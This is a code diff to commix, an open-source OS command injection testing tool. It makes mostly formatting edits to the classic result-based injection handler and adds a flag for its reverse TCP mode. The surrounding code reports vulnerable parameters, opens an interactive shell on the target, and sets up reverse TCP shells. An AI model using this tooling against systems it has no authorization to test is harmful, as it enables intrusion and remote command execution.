@@ -43,7 +43,7 @@ from src.core.injections.results_based.techniques.classic import cb_enumeration
 from src.core.injections.results_based.techniques.classic import cb_file_access
 
 """
-The "classic" technique on Result-based OS Command Injection.
+The "classic" technique on result-based OS command injection.
 """
 
 """
@@ -60,7 +60,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
   injection_type = "Results-based Command Injection"
   technique = "classic injection technique"
       
-  sys.stdout.write("(*) Testing the "+ technique + "... ")
+  sys.stdout.write("(*) Testing the " + technique + "... ")
   sys.stdout.flush()
   
   i = 0
@@ -147,19 +147,19 @@ def cb_injection_handler(url, delay, filename, http_request_method):
               float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
             
               if shell == False:
-                sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + float_percent +"%" + " ]")  
+                sys.stdout.write("\r(*) Testing the " + technique + "... " +  "[ " + float_percent + "%" + " ]")  
                 sys.stdout.flush()
 
               if percent == 100:
                 if no_result == True:
                   percent = Fore.RED + "FAILED" + Style.RESET_ALL
                 else:
-                  percent = str(float_percent)+"%"
+                  percent = str(float_percent)+ "%"
               elif len(shell) != 0:
                 percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
               else:
-                percent = str(float_percent)+"%"
-              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
+                percent = str(float_percent)+ "%"
+              sys.stdout.write("\r(*) Testing the " + technique + "... " +  "[ " + percent + " ]")  
               sys.stdout.flush()
               
           except KeyboardInterrupt: 
@@ -212,10 +212,10 @@ def cb_injection_handler(url, delay, filename, http_request_method):
             counter = counter + 1
             
             # Print the findings to terminal.
-            print Style.BRIGHT + "\n(!) The ("+ http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to "+ injection_type + "." + Style.RESET_ALL
-            print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-            print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-            print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", re.sub("%2B", "+",payload)) + Style.RESET_ALL
+            print Style.BRIGHT + "\n(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
+            print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
+            print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
+            print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", re.sub("%2B", "+",payload)) + Style.RESET_ALL
             
             # Check for any enumeration options.
             if settings.ENUMERATION_DONE == True :
@@ -266,7 +266,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
             go_back_again = False
             while True:
               if go_back == True:
-                break
+                break 
               gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
               if gotshell in settings.CHOISE_YES:
                 print ""
@@ -278,13 +278,13 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                     readline.parse_and_bind("tab: complete")
                     cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                     cmd = checks.escaped_cmd(cmd)
-                    if cmd.lower() in settings.SHELL_OPTIONS:
+                    if cmd.lower() in settings.SHELL_OPTIONS :
                       os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                       if os_shell_option == False:
                         if no_result == True:
                           return False
                         else:
-                          return True
+                          return True  
                       elif os_shell_option == "quit":                    
                         sys.exit(0)
                       elif os_shell_option == "back":
@@ -293,6 +293,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                       elif os_shell_option == "os_shell": 
                         print Fore.YELLOW + "(^) Warning: You are already into the 'os_shell' mode." + Style.RESET_ALL + "\n"
                       elif os_shell_option == "reverse_tcp":
+                        settings.REVERSE_TCP = True
                         # Set up LHOST / LPORT for The reverse TCP connection.
                         lhost, lport = reverse_tcp.configure_reverse_tcp()
                         while True:
@@ -306,6 +307,7 @@ def cb_injection_handler(url, delay, filename, http_request_method):
                               return False
                             elif result == 1 or result == 2:
                               go_back_again = True
+                              settings.REVERSE_TCP = False
                               break
                           # Command execution results.
                           response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
